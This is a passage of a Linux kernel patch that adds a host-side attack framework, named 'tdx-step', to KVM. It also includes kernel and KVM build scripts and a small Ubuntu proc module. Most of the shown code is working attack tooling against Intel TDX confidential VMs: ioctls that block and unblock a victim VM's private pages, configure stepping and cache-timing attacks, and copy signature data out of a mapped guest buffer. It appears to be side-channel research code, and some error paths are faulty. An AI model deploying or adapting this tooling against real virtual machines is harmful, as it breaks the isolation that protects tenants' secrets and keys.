++	uint64_t* target_trigger_sequence;
++	uint64_t target_trigger_sequence_len;
++
++	//number of measuremnts we want to do "back to back"
++	uint64_t want_attack_iterations;
++	//position in `target_trigger_sequence` at which we want to launch our attack
++	uint64_t tts_attack_pos;
++
++	//set of gpas that are allowed to be executed during AS_WAITING_FOR_DONE_MARKER
++	uint64_t* attack_phase_allowed_gpas;
++	uint64_t attack_phase_allowed_gpas_len;
++
++	uint64_t done_marker_gpa;
++	//list of gpas that should be ignored during the "track all" phase of the attack
++	uint64_t *ignored_gpas;
++	uint64_t ignored_gpas_len;
++
++	//TODO: add mechanism to export measurements
++	//we require an uint64_t  array of this size as input to TDX_STEP_TERMINATE_FR_VMCS
++	uint64_t gpa_shared_sigbuf;
++} tdx_step_fr_vmcs_t;
++
++//start attack:
++// TODO: rename and remove unecessary parts
++#define TDX_STEP_FR_VMCS _IOWR(KVMIO, 0xf3, tdx_step_fr_vmcs_t)
++
++typedef struct {
++	bool is_done;
++	uint64_t remaining_timer_interrupts;
++	uint64_t want_attack_iterations;
++	int attack_state;
++} tdx_step_is_fr_vmcs_done_t;
++#define TDX_STEP_IS_FR_VMCS_DONE _IOWR(KVMIO, 0xf6, tdx_step_is_fr_vmcs_done_t)
++
++
++typedef struct {
++	// Caller allocated output parameter that must either be a
++	// stumble_step_results_t or a freq_sneak_results_t depending on attack_type
++	void *data;
++} tdx_step_terminate_fr_vmcs_t;
++//stop monitoring vmcs struct with cache attack
++#define TDX_STEP_TERMINATE_FR_VMCS _IOWR(KVMIO, 0xf4, tdx_step_terminate_fr_vmcs_t)
++
++
+ #endif /* __LINUX_KVM_H */
+diff --git a/make-kernel.sh b/make-kernel.sh
+new file mode 100755
+index 000000000..eecc033a1
+--- /dev/null
++++ b/make-kernel.sh
+@@ -0,0 +1,31 @@
++#!/bin/bash
++
++run_cmd()
++{
++   echo "$*"
++
++   eval "$*" || {
++      echo "ERROR: $*"
++      exit 1
++   }
++}
++
++MAKE="make -j $(getconf _NPROCESSORS_ONLN) LOCALVERSION="
++
++#run_cmd $MAKE distclean
++
++run_cmd cp /boot/config-$(uname -r) .config
++run_cmd ./scripts/config --set-str LOCALVERSION "-tdxstep-v2"
++run_cmd ./scripts/config --disable LOCALVERSION_AUTO
++run_cmd ./scripts/config --disable DEBUG_INFO
++run_cmd ./scripts/config --disable CONFIG_DEBUG_KERNEL
++run_cmd ./scripts/config --disable SYSTEM_TRUSTED_KEYS
++run_cmd ./scripts/config --disable SYSTEM_REVOCATION_KEYS
++
++
++run_cmd $MAKE olddefconfig
++
++# Build
++run_cmd $MAKE
++run_cmd $MAKE bindeb-pkg
++
+diff --git a/make-kvm.sh b/make-kvm.sh
+new file mode 100755
+index 000000000..6bed79011
+--- /dev/null
++++ b/make-kvm.sh
+@@ -0,0 +1,22 @@
++#!/bin/bash
++
++set -e
++
++cores=$(nproc --all)
++
++#pull in config and prepare build process
++cp /boot/config-$(uname -r) .config
++make -j $cores scripts
++make -j $cores prepare
++make -j $cores modules_prepare
++
++#build kvm module and install it
++make -j $cores M=arch/x86/kvm/ LOCALVERSION="tdx-shared-mem"
++sudo cp ./arch/x86/kvm/kvm.ko "/lib/modules/$(uname -r)/kernel/arch/x86/kvm/"
++sudo cp ./arch/x86/kvm/kvm-intel.ko "/lib/modules/$(uname -r)/kernel/arch/x86/kvm/"
++
++#reload kvm module
++echo "Unloading kvm_intel and kvm module"
++sudo modprobe -r  kvm_intel kvm
++echo "Reloading kvm_intel and kvm module"
++sudo modprobe  kvm_intel
+\ No newline at end of file
+diff --git a/ubuntu/Kconfig b/ubuntu/Kconfig
+new file mode 100644
+index 000000000..6be41b464
+--- /dev/null
++++ b/ubuntu/Kconfig
+@@ -0,0 +1,24 @@
++menu "Ubuntu Supplied Third-Party Device Drivers"
++
++
++config UBUNTU_ODM_DRIVERS
++	bool "Ubuntu ODM supplied drivers"
++	help
++	  Turn on support for Ubuntu ODM supplied drivers
++
++#
++# NOTE: to allow drivers to be added and removed without causing merge
++# collisions you should add new entries in the middle of the six lines
++# of ## at the bottom of the list.  Always add three lines of ## above
++# your new entry and maintain the six lines below.
++#
++
++##
++##
++##
++source "ubuntu/ubuntu-host/Kconfig"
++##
++##
++##
++
++endmenu
+diff --git a/ubuntu/Makefile b/ubuntu/Makefile
+new file mode 100644
+index 000000000..4a76de2f5
+--- /dev/null
++++ b/ubuntu/Makefile
+@@ -0,0 +1,18 @@
++#
++# Makefile for the Linux kernel ubuntu supplied third-party device drivers.
++#
++
++#
++# NOTE: to allow drivers to be added and removed without causing merge
++# collisions you should add new entries in the middle of the six lines
++# of ## at the bottom of the list.  Always add three lines of ## above
++# your new entry and maintain the six lines below.
++#
++
++##
++##
++##
++obj-$(CONFIG_UBUNTU_HOST)      += ubuntu-host/
++##
++##
++##
+diff --git a/ubuntu/include/Kbuild b/ubuntu/include/Kbuild
+new file mode 100644
+index 000000000..139597f9c
+--- /dev/null
++++ b/ubuntu/include/Kbuild
+@@ -0,0 +1,2 @@
++
++
+diff --git a/ubuntu/include/README b/ubuntu/include/README
+new file mode 100644
+index 000000000..adc8d33e6
+--- /dev/null
++++ b/ubuntu/include/README
+@@ -0,0 +1,4 @@
++Only use this directory for things which need to share their headers with
++other parts of the kernel or other modules in ubuntu/
++
++Otherwise, keep them local to the module directory.
+diff --git a/ubuntu/ubuntu-host/Kconfig b/ubuntu/ubuntu-host/Kconfig
+new file mode 100644
+index 000000000..1989da68b
+--- /dev/null
++++ b/ubuntu/ubuntu-host/Kconfig
+@@ -0,0 +1,5 @@
++config UBUNTU_HOST
++	tristate "proc dir for exporting host data to containers"
++	help
++	  Creates an ubuntu-host directory in proc for providing data from
++	  Ubuntu hosts to containers.
+diff --git a/ubuntu/ubuntu-host/Makefile b/ubuntu/ubuntu-host/Makefile
+new file mode 100644
+index 000000000..fef3c1319
+--- /dev/null
++++ b/ubuntu/ubuntu-host/Makefile
+@@ -0,0 +1 @@
++obj-$(CONFIG_UBUNTU_HOST) += ubuntu-host.o
+diff --git a/ubuntu/ubuntu-host/ubuntu-host.c b/ubuntu/ubuntu-host/ubuntu-host.c
+new file mode 100644
+index 000000000..1abd40253
+--- /dev/null
++++ b/ubuntu/ubuntu-host/ubuntu-host.c
+@@ -0,0 +1,68 @@
++#include <linux/uaccess.h>
++#include <linux/module.h>
++#include <linux/kernel.h>
++#include <linux/proc_fs.h>
++#include <asm/uaccess.h>
++
++#define PROC_DIR		"ubuntu-host"
++
++#define ESM_TOKEN_FILE		"esm-token"
++#define ESM_TOKEN_MAX_SIZE		64
++
++static struct proc_dir_entry *proc_dir;
++static char esm_token_buffer[ESM_TOKEN_MAX_SIZE];
++
++static ssize_t esm_token_read(struct file *f, char __user *buf, size_t len,
++			      loff_t *off)
++{
++	return simple_read_from_buffer(buf, len, off, esm_token_buffer,
++				       strlen(esm_token_buffer));
++}
++
++static ssize_t esm_token_write(struct file *f, const char __user *buf,
++			       size_t len, loff_t *off)
++{
++	ssize_t ret;
++
++	if (len >= ESM_TOKEN_MAX_SIZE - 1)
++		return -EINVAL;
++
++	ret = simple_write_to_buffer(esm_token_buffer, ESM_TOKEN_MAX_SIZE - 1,
++				     off, buf, len);
++	if (ret >= 0)
++		esm_token_buffer[ret] = '\0';
++
++	return ret;
++}
++
++static const struct proc_ops esm_token_fops = {
++	.proc_read = esm_token_read,
++	.proc_write = esm_token_write,
++};
++
++static void ubuntu_host_cleanup(void)
++{
++	remove_proc_entry(ESM_TOKEN_FILE, proc_dir);
++	proc_remove(proc_dir);
++}
++
++static int __init ubuntu_host_init(void)
++{
++	proc_dir = proc_mkdir(PROC_DIR, NULL);
++	if (!proc_dir) {
++		pr_err("Failed to create ubuntu-host dir\n");
++		return -ENOMEM;
++	}
++
++	if (!proc_create_data(ESM_TOKEN_FILE, 0644, proc_dir, &esm_token_fops, NULL)) {
++		pr_err("Failed to create esm-tokan file\n");
++		ubuntu_host_cleanup();
++		return -ENOMEM;
++	}
++
++	return 0;
++}
++
++module_init(ubuntu_host_init);
++module_exit(ubuntu_host_cleanup);
++MODULE_LICENSE("GPL");
+diff --git a/virt/kvm/kvm_main.c b/virt/kvm/kvm_main.c
+index 590549e34..dd6c6f152 100644
+--- a/virt/kvm/kvm_main.c
++++ b/virt/kvm/kvm_main.c
+@@ -13,6 +13,8 @@
+  *   Yaniv Kamay  <yaniv@qumranet.com>
+  */
+ 
++#include "asm/page_types.h"
++#include "asm/pgtable_types.h"
+ #include <kvm/iodev.h>
+ 
+ #include <linux/kvm_host.h>
+@@ -69,6 +71,9 @@
+ 
+ #include <linux/kvm_dirty_ring.h>
+ 
++#include "../../arch/x86/kvm/vmx/tdx.h"
++#include <linux/tdx_step.h>
++
+ 
+ /* Worst case buffer size needed for holding an integer. */
+ #define ITOA_MAX_LEN 12
+@@ -76,6 +81,11 @@
+ MODULE_AUTHOR("Qumranet");
+ MODULE_LICENSE("GPL");
+ 
++#define TRACKED_VMS_CAP  10
++my_vm_state_t tracked_vms[TRACKED_VMS_CAP] = {{.kvm=NULL,.called_split_pages=false,.valid=false},{.kvm=NULL,.called_split_pages=false,.valid=false},{.kvm=NULL,.called_split_pages=false,.valid=false},{.kvm=NULL,.called_split_pages=false,.valid=false},{.kvm=NULL,.called_split_pages=false,.valid=false},{.kvm=NULL,.called_split_pages=false,.valid=false},{.kvm=NULL,.called_split_pages=false,.valid=false},{.kvm=NULL,.called_split_pages=false,.valid=false},{.kvm=NULL,.called_split_pages=false,.valid=false},{.kvm=NULL,.called_split_pages=false,.valid=false}};
++int tracked_vms_next_idx = 0;
++EXPORT_SYMBOL(tracked_vms);
++
+ /* Architectures should define their poll value according to the halt latency */
+ unsigned int halt_poll_ns = KVM_HALT_POLL_NS_DEFAULT;
+ module_param(halt_poll_ns, uint, 0644);
+@@ -1362,6 +1372,13 @@ static void kvm_destroy_vm(struct kvm *kvm)
+ 	int i;
+ 	struct mm_struct *mm = kvm->mm;
+ 
++	for( i = 0; i < TRACKED_VMS_CAP; i++) {
++		if( tracked_vms[i].valid && tracked_vms[i].kvm == kvm) {
++			printk("untracking vm with pid %d\n", kvm->userspace_pid);
++			tracked_vms[i].valid = false;
++		}
++	}
++
+ 	kvm_destroy_pm_notifier(kvm);
+ 	kvm_uevent_notify_change(KVM_EVENT_DESTROY_VM, kvm);
+ 	kvm_destroy_vm_debugfs(kvm);
+@@ -5559,6 +5576,18 @@ static int kvm_dev_ioctl_create_vm(unsigned long type)
+ 	kvm_uevent_notify_change(KVM_EVENT_CREATE_VM, kvm);
+ 
+ 	fd_install(fd, file);
++
++	printk("tracking newly created VM with pid %d at idx %d\n", kvm->userspace_pid ,tracked_vms_next_idx);
++	if(tracked_vms[tracked_vms_next_idx].valid) {
++		printk("WARNING, overriding valid tracked VM entry\n");
++	}
++	tracked_vms[tracked_vms_next_idx].kvm = kvm;
++	tracked_vms[tracked_vms_next_idx].called_split_pages = false;
++	tracked_vms[tracked_vms_next_idx].valid = true;
++
++
++	tracked_vms_next_idx = (tracked_vms_next_idx + 1 )% (TRACKED_VMS_CAP);
++
+ 	return fd;
+ 
+ put_kvm:
+@@ -5568,12 +5597,441 @@ put_fd:
+ 	return r;
+ }
+ 
++/**
++ * @brief Create a host mapping (hva) to the  @page_count guest pages starting at @gpa. Only works for shared pages. Use get_aliased_mapping_for_sept_gpa for private TD pages 
++ * 
++ * @param gpa 
++ * @param page_count pin this many physically contiguous pages
++ * @param hva_alias caller allocated result param
++ * @param pinned_page caller allocated result param that must be able to store @page_count entries. filled with the pages that were pinned
++ * for this mapping. Must be unpinned with unpin_user_pages
++ * 
++ * @return int 0 on success
++ */
++static int get_aliased_mapping_for_gpa(int vm_pid, uint64_t gpa, uint64_t page_count, uint64_t* hva_alias,
++	struct page** pinned_pages) {
++	uint64_t gfn;
++	uint64_t tmp_hva;
++	int locked;
++	void* kernel_mapping;
++	struct kvm_vcpu* vcpu;
++	int idx;
++	my_vm_state_t* main_vm;
++
++
++	main_vm = get_vm(vm_pid);
++	if( main_vm == NULL ){
++		printk("%s:%d did not find vm for pid %d", __FILE__, __LINE__, vm_pid);
++		return 1;
++	}
++
++
++	vcpu = xa_load(&main_vm->kvm->vcpu_array,0);
++	gfn = gpa >> PAGE_SHIFT;
++	mmap_read_lock(main_vm->kvm->mm);
++	locked = 1;
++	for(idx = 0; idx < page_count; idx++) {
++		tmp_hva = kvm_vcpu_gfn_to_hva(vcpu, gfn);
++		//in the sev-step implementation, we called this with FOLL_LONGTERM
++		//however, this does not seem to work here (at least not for the shared GPA)
++		//that I have tried. Without that flag we still have FOLL_PIN set, that should allow us to touch the data in the pinned page. However, FOLL_LONGTERM should be more suiteable, as  "this is for pages that
++		//will be pinned longterm, and whose data will be accessed" (c.f. Documentation/core-api/pin_user_pages.rst)
++		if (pin_user_pages_remote(main_vm->kvm->mm,
++			tmp_hva, 1, FOLL_LONGTERM, pinned_pages+idx,&locked) != 1) {
++			mmap_read_unlock(main_vm->kvm->mm);
++			printk("pin_user_pages_remote failed for gpa 0x%llx , tmp_hva 0x%llx\n", gfn << PAGE_SHIFT, tmp_hva);
++			return 1;
++		}
++
++		gfn += 1;
++	}
++	mmap_read_unlock(main_vm->kvm->mm);
++
++
++	
++	
++
++
++	if( pinned_pages[0] == NULL ) {
++		printk("%s:%d page returned by get_user_pages_remote was NULL",__FILE__,__LINE__);
++		return 1;
++	}
++	//printk("%s : gpa  0x%llx , hpa 0x%lx", __FUNCTION__, gpa, page_to_pfn(page[0]) << 12);
++//page kernel is (__PP|__RW|   0|___A|__NX|___D|   0|___G)
++	kernel_mapping = vmap(pinned_pages,page_count,0,PAGE_KERNEL);
++	if( kernel_mapping == NULL ) {
++		printk("%s:%d : get_aliased_mapping_for_gpa :"
++			"vmap failed",__FILE__,__LINE__);
++		unpin_user_pages(pinned_pages,page_count);
++		return 1;
++	}
++	//re-add page offse from the gpa
++	kernel_mapping += (gpa & 0xfff);
++
++	(*hva_alias) = (uint64_t)kernel_mapping;
++	return 0;
++
++}
++
++static int handle_tdx_step_is_fr_vmcs_done(void __user *argp) {
++	tdx_step_is_fr_vmcs_done_t result;
++	char* name = "TDX_STEP_IS_FR_VMCS_DONE";
++	//TODO: implement freq sneak vs stumble stepping specific stuff
++	spin_lock(&tdx_step_config_lock);
++	result.is_done = (tdx_step_config.attack_cfg.state == AS_INACTIVE) && (tdx_step_config.attack_cfg.current_attack_iteration_idx >= (tdx_step_config.attack_cfg.want_attack_iterations-1));
++	result.remaining_timer_interrupts = tdx_step_config.attack_cfg.current_attack_iteration_idx;
++	result.attack_state = tdx_step_config.attack_cfg.state;
++	result.want_attack_iterations = tdx_step_config.attack_cfg.want_attack_iterations;
++	spin_unlock(&tdx_step_config_lock);
++	if( copy_to_user(argp, &result, sizeof(tdx_step_is_fr_vmcs_done_t))) {
++		printk("%s: failed to copy timings to user space\n", name);
++		return -EINVAL;
++	}
++	return 0;
++}
++
++static int handle_tdx_step_fr_vmcs(void __user *argp ) {
++	struct kvm_vcpu* vcpu;
++	tdx_step_fr_vmcs_t params;
++	struct page* page_shared_mem = NULL;
++	uint64_t hva_shared_mem = 0;
++	uint64_t* target_trigger_sequence;
++	uint64_t target_trigger_sequence_bytes;
++	uint64_t* attack_phase_allowed_gpas;
++	uint64_t attack_phase_allowed_gpas_bytes;
++
++	struct page** page_shared_sigbuf = NULL;
++	uint64_t hva_shared_sigbuf = 0;
++
++
++	char* name = "TDX_STEP_FR_VMCS";
++	printk("%s: entering", name);
++	my_vm_state_t* main_vm;
++	if( copy_from_user(&params, argp, sizeof(params))) {
++		printk("%s: failed to copy params\n",name);
++		return -EINVAL;
++	}
++
++	main_vm = get_vm(params.victim_vm_pid);
++	if(main_vm == NULL ) {
++		printk("%s: main_vm still NULL\n", name);
++		return -EINVAL;
++	}
++
++
++	//get first vcpu of main_vm
++	vcpu = xa_load(&main_vm->kvm->vcpu_array,0);
++
++
++	if(!main_vm->called_split_pages) {
++		printk("%s calling my_split_all_pages\n", name);
++		my_split_all_pages_fnptr(vcpu, PG_LEVEL_4K);
++		main_vm->called_split_pages = true;
++	}
++
++	if( params.gpa_shared_sigbuf != 0 ) {
++		int r;
++		printk("%s: mounting shared sigbuf...\n", name);
++		page_shared_sigbuf = kmalloc(sizeof(struct page*)*TDX_STEP_SHARED_SIGBUF_PAGES, GFP_KERNEL);
++		printk("%s: trying to map gpa_shared_sigbuf 0x%llx\n", name, (uint64_t)params.gpa_shared_sigbuf);
++		r = get_aliased_mapping_for_gpa(params.victim_vm_pid,params.gpa_shared_sigbuf, TDX_STEP_SHARED_SIGBUF_PAGES, &hva_shared_sigbuf, page_shared_sigbuf);
++		if(r) {
++			printk("%s: get_aliased_mapping_for_gpa for gpa=0x%llx failed with %d\n",
++				name,
++				params.gpa_shared_sigbuf,
++				r
++			);
++		} else {
++			printk("%s mapped %u parges starting at gpa 0x%llx to hva 0x%llx\n", name, TDX_STEP_SHARED_SIGBUF_PAGES, params.gpa_shared_sigbuf, hva_shared_sigbuf);
++		}
++	}
++
++
++
++	target_trigger_sequence = NULL;
++	if (params.target_trigger_sequence != NULL ) {
++		uint64_t idx;
++		target_trigger_sequence_bytes = sizeof(uint64_t) * params.target_trigger_sequence_len;
++		target_trigger_sequence = kmalloc(target_trigger_sequence_bytes, GFP_KERNEL);
++		if( copy_from_user(target_trigger_sequence, params.target_trigger_sequence, target_trigger_sequence_bytes)) {
++			printk("%s: failed to copy target_trigger_sequence\n",name);
++			return -EINVAL;
++		}
++		if( params.target_trigger_sequence_len < 100) {
++			printk("target_trigger_sequence:\n");
++			for( idx = 0; idx < params.target_trigger_sequence_len; idx++) {
++				printk("0x%llx\n", target_trigger_sequence[idx]);
++			}
++		}
++	}
++	
++
++	attack_phase_allowed_gpas = NULL;
++	if( params.attack_phase_allowed_gpas != NULL ) {
++		uint64_t idx;
++		attack_phase_allowed_gpas_bytes = sizeof(uint64_t) * params.attack_phase_allowed_gpas_len;
++		attack_phase_allowed_gpas = kmalloc( attack_phase_allowed_gpas_bytes, GFP_KERNEL);
++		if( copy_from_user(attack_phase_allowed_gpas, params.attack_phase_allowed_gpas, attack_phase_allowed_gpas_bytes)) {
++			printk("%s: failed to copy attack_phase_allowed_gpas\n",name);
++			return -EINVAL;
++		}
++		printk("attack_phase_allowed_gpas:\n");
++		for( idx = 0; idx < params.attack_phase_allowed_gpas_len; idx++ ) {
++			printk("0x%llx\n", attack_phase_allowed_gpas[idx]);
++		}
++	}
++
++	//
++	//update config for apic timer attack
++	//
++
++	spin_lock(&tdx_step_config_lock);
++
++	if(page_shared_sigbuf != NULL ) {
++		printk("%s applying shared sigbuf config, hva_shared_sigbuf = 0x%llx\n", name, (uint64_t)hva_shared_sigbuf);
++		memcpy(tdx_step_config.attack_cfg.pinned_page_shared_sigbuf, page_shared_sigbuf,sizeof(struct page*)*TDX_STEP_SHARED_SIGBUF_PAGES);
++		kfree(page_shared_sigbuf);
++		tdx_step_config.attack_cfg.mapping_shared_sigbuf = (uint8_t*)hva_shared_sigbuf;
++		tdx_step_config.attack_cfg.shared_sigbuf_gpa = params.gpa_shared_sigbuf;
++	} else {
++		memset(tdx_step_config.attack_cfg.pinned_page_shared_sigbuf, 0, sizeof(tdx_step_config.attack_cfg.pinned_page_shared_sigbuf));
++		tdx_step_config.attack_cfg.mapping_shared_sigbuf = 0;
++		tdx_step_config.attack_cfg.shared_sigbuf_gpa = 0;
++	}
++
++	tdx_step_config.attack_cfg.want_attack_iterations = params.want_attack_iterations;
++	tdx_step_config.attack_cfg.current_attack_iteration_idx = 0;
++	tdx_step_config.attack_cfg.tts_attack_pos = params.tts_attack_pos;
++
++	tdx_step_config.suppressed_interrupt_during_stepping = false;
++
++	//setup attack_cfg member
++	tdx_step_config.attack_cfg.state = AS_SETUP_PENDING;
++	tdx_step_config.attack_cfg.target_gpa = params.target_gpa;
++	printk("%s setting victim vm pid to %d\n", name, params.victim_vm_pid);
++	tdx_step_config.victim_vm_pid = params.victim_vm_pid;
++	tdx_step_config.attack_cfg.current_step_count = 0;
++	tdx_step_config.attack_cfg.step_counts = vzalloc(sizeof(uint64_t) * params.want_attack_iterations);
++
++	//TODO: kfree
++	tdx_step_config.attack_cfg.target_trigger_sequence = target_trigger_sequence;
++	tdx_step_config.attack_cfg.target_trigger_sequence_len = params.target_trigger_sequence_len;
++	tdx_step_config.attack_cfg.tts_idx = 0;
++
++	//TODO: kfree
++	tdx_step_config.attack_cfg.attack_phase_allowed_gpas = attack_phase_allowed_gpas;
++	tdx_step_config.attack_cfg.attack_phase_allowed_gpas_len = params.attack_phase_allowed_gpas_len;
++
++
++	tdx_step_config.attack_cfg.done_marker_gpa =
++		params.done_marker_gpa;
++	tdx_step_config.attack_cfg.unrelated_faults_used_len = 0;
++	if ((params.ignored_gpas != NULL) &&
++		(params.ignored_gpas_len > 0)) {
++		tdx_step_config.attack_cfg.ignored_gpas_len =
++			params.ignored_gpas_len;
++		tdx_step_config.attack_cfg.ignored_gpas = kmalloc(
++			params.ignored_gpas_len * sizeof(uint64_t),
++			GFP_KERNEL);
++		if (copy_from_user(
++				tdx_step_config.attack_cfg.ignored_gpas,
++				params.ignored_gpas,
++				params.ignored_gpas_len *
++					sizeof(uint64_t))) {
++			printk("%s:%d [%s] failed to copy ignored_gpas to kernel\n",
++					__FILE__, __LINE__, __FUNCTION__);
++			return -EINVAL;
++			spin_unlock(&tdx_step_config_lock);
++		}
++	} else {
++		tdx_step_config.attack_cfg.ignored_gpas = NULL;
++		tdx_step_config.attack_cfg.ignored_gpas_len = 0;
++	}
++
++
++	tdx_step_config.entries_since_stepping_attack = 0;
++	tdx_step_config.entries_while_active_stepping_attack = 0;
++
++
++	tdx_step_config.pinned_page_shared_mem = page_shared_mem;
++	tdx_step_config.mapping_shared_mem = (uint64_t*)hva_shared_mem;
++
++	spin_unlock(&tdx_step_config_lock);
++
++
++	printk("%s: leaving", name);
++	return 0;
++}
++
++static int handle_tdx_step_terminate_fr_vmcs(void __user *argp) {
++	tdx_step_terminate_fr_vmcs_t params;
++		char* name = "TDX_STEP_TERMINATE_FR_VMCS";
++		int r;
++		r = 0;
++		graz_step_results_t results;
++
++		//Free shared mem region, if it exists
++		if( tdx_step_config.mapping_shared_mem ) {
++			vunmap(tdx_step_config.mapping_shared_mem);
++			tdx_step_config.mapping_shared_mem = NULL;
++		}
++		if( tdx_step_config.pinned_page_shared_mem ) {
++			unpin_user_pages(&tdx_step_config.pinned_page_shared_mem,1);
++			tdx_step_config.pinned_page_shared_mem = NULL;
++		}
++
++
++		if( copy_from_user(&params, argp, sizeof(params))) {
++			printk("%s: failed to copy params\n",name);
++			return -EINVAL;
++		}
++
++		//Copy results to user
++
++		if(copy_from_user(&results, params.data, sizeof(graz_step_results_t))) {
++			printk("%s failed to copy graz_step_results_t struct\n", name);
++			return -EINVAL;
++		}
++
++		printk("%s: user step counts array vaddr is 0x%llx\n", name, (uint64_t) results.step_counts);
++		if( copy_to_user(results.step_counts, tdx_step_config.attack_cfg.step_counts, sizeof(uint64_t)*tdx_step_config.attack_cfg.want_attack_iterations)) {
++			printk("%s: failed to copy step counts to userspace\n", name);
++		}
++
++		vfree(tdx_step_config.attack_cfg.step_counts);
++		tdx_step_config.attack_cfg.step_counts = NULL;
++
++		//Copying signature data
++		if( tdx_step_config.attack_cfg.mapping_shared_sigbuf != NULL ) {
++			printk("Copying signature data\n");
++			if(copy_to_user(results.signature_data,tdx_step_config.attack_cfg.mapping_shared_sigbuf, TDX_STEP_SHARED_SIGBUF_PAGES * PAGE_SIZE)) {
++				printk("%s: failed to copy signature data from 0x%llx to 0x%llx\n", name, (uint64_t)tdx_step_config.attack_cfg.mapping_shared_sigbuf, (uint64_t)results.signature_data);
++			}
++			vunmap(tdx_step_config.attack_cfg.mapping_shared_sigbuf);
++			tdx_step_config.attack_cfg.mapping_shared_sigbuf = NULL;
++			unpin_user_pages(tdx_step_config.attack_cfg.pinned_page_shared_sigbuf,TDX_STEP_SHARED_SIGBUF_PAGES);
++			memset(tdx_step_config.attack_cfg.pinned_page_shared_sigbuf, 0, sizeof(tdx_step_config.attack_cfg.pinned_page_shared_sigbuf));			
++			tdx_step_config.attack_cfg.shared_sigbuf_gpa = 0;
++		}
++		
++		if( tdx_step_config.attack_cfg.state != AS_INACTIVE ) {
++			my_vm_state_t* main_vm;
++			struct kvm_vcpu* vcpu;
++
++			main_vm = get_vm(tdx_step_config.victim_vm_pid);
++			if(main_vm == NULL) {
++				printk("%s: did not find vm struct; cannot untrack ", name);
++				tdx_step_config.attack_cfg.state = AS_TEARDOWN_PENDING;
++				return -EINVAL;
++			}
++
++			vcpu = xa_load(&main_vm->kvm->vcpu_array,0);
++			printk("%s: Attack cancelled in state %d, untracking all and setting state to teardown pending\n", name, tdx_step_config.attack_cfg.state);
++			kvm_stop_tracking_fnptr(vcpu);
++			tdx_step_config.attack_cfg.state = AS_TEARDOWN_PENDING;
++		}
++		return r;
++}
++
+ static long kvm_dev_ioctl(struct file *filp,
+ 			  unsigned int ioctl, unsigned long arg)
+ {
+ 	int r = -EINVAL;
++	void __user *argp = (void __user *)arg;
+ 
+ 	switch (ioctl) {
++		case TDX_STEP_BLOCK_PAGE: {
++		tdx_step_block_page_t params;
++		char* name = "TDX_STEP_BLOCK_PAGE";
++		my_vm_state_t* main_vm;
++		struct kvm_vcpu* vcpu;
++
++		if( copy_from_user(&params, argp, sizeof(params))) {
++			printk("%s: failed to copy params\n",name);
++			r = -EINVAL;
++			goto out;
++		}
++
++		main_vm = get_vm(params.vm_pid);
++		if(main_vm == NULL ) {
++			printk("%s: main_vm still NULL\n", name);
++			r = -EINVAL;
++			goto out;
++		}
++
++		if(main_vm->kvm == NULL ) {
++			printk("%s: main_vm->kvm still NULL\n", name);
++			r = -EINVAL;
++			goto out;
++		}
++
++		//get first vcpu of main_vm
++		vcpu = xa_load(&main_vm->kvm->vcpu_array,0);
++		if(vcpu == NULL ) {
++			printk("%s: main_vm vcpu still NULL\n", name);
++			r = -EINVAL;
++			goto out;
++		}
++
++		if(!main_vm->called_split_pages) {
++			printk("%s calling my_split_all_pages\n", name);
++			my_split_all_pages_fnptr(vcpu, PG_LEVEL_4K);
++			main_vm->called_split_pages = true;
++		}
++
++		//printk("%s: calling my_tdx_sept_zap_private_spte_fnptr on gfn=0x%llx for VM with pid %d\n", name, params.gpa >> 12, main_vm->kvm->userspace_pid);
++		if(!my_tdx_sept_zap_private_spte_fnptr(main_vm->kvm, params.gpa >> 12, PG_LEVEL_4K, false)) {
++			printk("%s blocking FAILED\n", name);
++		}; 
++	
++		r = 0;
++		}
++		break;
++	case TDX_STEP_UNLBOCK_PAGE: {
++		tdx_step_unblock_page_t params;
++		char* name = "TDX_STEP_UNLBOCK_PAGE";
++		my_vm_state_t* main_vm;
++		struct kvm_vcpu* vcpu;
++		if( copy_from_user(&params, argp, sizeof(params))) {
++			printk("%s: failed to copy params\n",name);
++			r = -EINVAL;
++			goto out;
++		}
++
++		main_vm = get_vm(params.vm_pid);
++		if(main_vm == NULL ) {
++			printk("%s: main_vm still NULL\n", name);
++			r = -EINVAL;
++			goto out;
++		}
++
++
++		//get first vcpu of main_vm
++		vcpu = xa_load(&main_vm->kvm->vcpu_array,0);
++
++
++		if(!main_vm->called_split_pages) {
++			printk("%s calling my_split_all_pages\n", name);
++			my_split_all_pages_fnptr(vcpu, PG_LEVEL_4K);
++			main_vm->called_split_pages = true;
++		}
++
++		//printk("%s: calling my_tdx_sept_unzap_private_spte_fnptr on gfn=0x%llx...\n", name, params.gpa >> 12);
++		if(!my_tdx_sept_unzap_private_spte_fnptr(vcpu, params.gpa >> 12, PG_LEVEL_4K, false)) {
++			//printk("%s unblocking FAILED\n", name);
++		}; 
++		r = 0;
++	}
++	break;
++	case TDX_STEP_IS_FR_VMCS_DONE:
++		r = handle_tdx_step_is_fr_vmcs_done(argp);
++		break;
++	case TDX_STEP_FR_VMCS:
++		r = handle_tdx_step_fr_vmcs(argp);
++	break;
++	case TDX_STEP_TERMINATE_FR_VMCS:
++		r = handle_tdx_step_terminate_fr_vmcs(argp);
++		break;
+ 	case KVM_GET_API_VERSION:
+ 		if (arg)
+ 			goto out;
